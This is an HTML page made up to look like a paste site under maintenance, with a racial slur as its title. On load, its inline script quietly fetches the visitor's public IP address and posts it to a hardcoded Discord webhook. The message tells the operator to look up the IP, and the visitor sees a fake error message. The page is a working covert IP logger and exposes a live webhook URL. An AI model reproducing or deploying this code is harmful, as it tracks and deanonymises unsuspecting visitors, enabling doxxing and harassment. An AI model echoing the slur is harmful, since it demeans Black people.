<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NiggaBin</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #000000;
    }
    .container {
      text-align: center;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    p {
      margin-bottom: 20px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>could not load on ur browser</h1>
    <p>!!!</p>
    <p id="status" style="color: red;">Please wait...</p>
  </div>

  <script>
    (async () => {
      const status = document.getElementById('status');
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        const webhookUrl = 'https://discord.com/api/webhooks/1330725771702173706/zoPF03P1qXOAZPqTLWJ-_cf5rW4dusYesdSDa80ThO8TjIXPpgFMdd9n8lVr01lCTSlE';
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**New client IP: ${userIP}**\n**Go to https://www.whatismyip.com/ and put the ip in to get all info!`,
          }),
        });

        if (response.ok) {
          status.textContent = 'NiggaBin is Under Maintenance Please Try Again Later!';
          status.style.color = 'red';
        } else {
          status.textContent = 'Failed to process your information. Please try again later.';
        }
      } catch (error) {
        console.error('Error:', error);
        status.textContent = 'An error occurred. Please try again later.';
      }
    })();
  </script>
</body>
</html>
